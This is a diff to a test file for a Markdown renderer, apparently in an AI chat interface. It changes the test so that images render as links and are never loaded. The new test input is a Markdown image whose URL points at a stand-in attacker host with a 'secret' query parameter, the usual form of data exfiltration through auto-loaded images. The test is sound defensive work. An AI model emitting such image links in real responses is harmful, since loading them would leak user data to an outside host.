@@ -289,14 +289,25 @@ describe("Markdown response controls and semantics", () => {
     ).not.toBeNull()
   })
 
-  it("does not convert an image-only link into a text pill", () => {
-    const body = renderMarkdown(
+  it("renders images as links instead of loading them", () => {
+    const image = renderMarkdown("![Chart](https://evil.example/?d=secret)")
+    const imageLink = image.querySelector("a")
+
+    expect(image.querySelector("img")).toBeNull()
+    expect(imageLink?.getAttribute("href")).toBe(
+      "https://evil.example/?d=secret"
+    )
+    expect(imageLink?.textContent).toBe("Chart")
+
+    // Inside a link the image keeps only its label: anchors cannot nest.
+    const linked = renderMarkdown(
       "[![Example logo](https://example.com/logo.png)](https://example.com)"
     )
-    const link = body.querySelector("a")
 
-    expect(link?.dataset.linkPresentation).toBe("inline")
-    expect(link?.querySelector("img")?.getAttribute("alt")).toBe("Example logo")
+    expect(linked.querySelector("img")).toBeNull()
+    expect(linked.querySelectorAll("a")).toHaveLength(1)
+    expect(linked.querySelector("a")?.textContent).toBe("Example logo")
+    expect(linked.querySelector("a")?.dataset.linkPresentation).toBe("inline")
   })
 
   it("preserves nested formatting inside an inline link", () => {
